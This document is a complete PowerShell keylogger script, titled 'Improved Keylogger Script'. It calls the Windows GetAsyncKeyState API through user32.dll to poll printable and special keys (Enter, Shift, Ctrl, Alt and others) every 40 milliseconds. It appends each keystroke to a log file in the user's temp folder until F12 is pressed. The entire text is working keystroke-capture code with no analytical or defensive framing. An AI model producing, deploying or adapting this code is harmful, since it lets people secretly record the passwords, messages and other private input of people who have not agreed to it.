# Improved Keylogger Script
$logFile = "$env:temp\keylog.txt"
$signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
$getKeyState = Add-Type -MemberDefinition $signature -Name "Keyboard" -Namespace "Win32" -PassThru

# Create log file
if (-not (Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File | Out-Null
    Add-Content -Path $logFile -Value "Keylogger started at $(Get-Date)`n"
}

Write-Host "Keylogger is running. Press F12 to stop."
Write-Host "Logging to: $logFile"

# Main loop
while ($true) {
    Start-Sleep -Milliseconds 40
    
    # Check all printable ASCII characters (32-126)
    for ($ascii = 32; $ascii -le 126; $ascii++) {
        $state = $getKeyState::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $keyChar = [char]$ascii
            Add-Content -Path $logFile -Value $keyChar -NoNewline
        }
    }
    
    # Check special keys
    $specialKeys = @{
        "8" = "[BACKSPACE]"
        "9" = "[TAB]"
        "13" = "[ENTER]"
        "27" = "[ESC]"
        "32" = " "
        "160" = "[SHIFT]"
        "162" = "[CTRL]"
        "164" = "[ALT]"
        "91" = "[WIN]"
    }
    
    foreach ($key in $specialKeys.Keys) {
        $state = $getKeyState::GetAsyncKeyState($key)
        if ($state -eq -32767) {
            Add-Content -Path $logFile -Value $specialKeys[$key] -NoNewline
        }
    }
    
    # Exit condition (F12)
    if ($getKeyState::GetAsyncKeyState(123) -eq -32767) {
        Add-Content -Path $logFile -Value "`nKeylogger stopped at $(Get-Date)"
        break
    }
}